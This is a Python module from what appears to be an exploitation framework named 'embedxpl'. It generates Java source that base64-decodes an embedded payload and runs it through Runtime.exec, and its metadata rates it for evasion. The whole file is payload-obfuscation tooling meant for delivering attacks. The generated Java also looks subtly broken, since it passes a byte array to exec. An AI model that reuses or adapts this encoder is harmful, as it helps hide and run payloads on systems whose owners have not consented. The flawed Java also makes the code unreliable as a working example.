"""Java base64 encoder — gera source Java com payload embutido."""

import base64
from embedxpl.core.exploit.encoders import BaseEncoder
from embedxpl.core.exploit.payloads import Architectures


class Encoder(BaseEncoder):
    __info__ = {
        "name": "Java Base64 Encoder",
        "description": "Generates Java source with base64-embedded payload. Set encoder.class_name if desired.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
        "evasion_score": 5,
    }

    architecture = None
    class_name: str = "Payload"

    def encode(self, payload: bytes) -> bytes:  # type: ignore[override]
        b64 = base64.b64encode(payload).decode()
        src = (
            f"import java.util.Base64;\n"
            f"public class {self.class_name} {{\n"
            f"    public static void main(String[] a) throws Exception {{\n"
            f'        byte[] sc = Base64.getDecoder().decode("{b64}");\n'
            f"        Process p = Runtime.getRuntime().exec(sc);\n"
            f"    }}\n}}\n"
        )
        return src.encode()
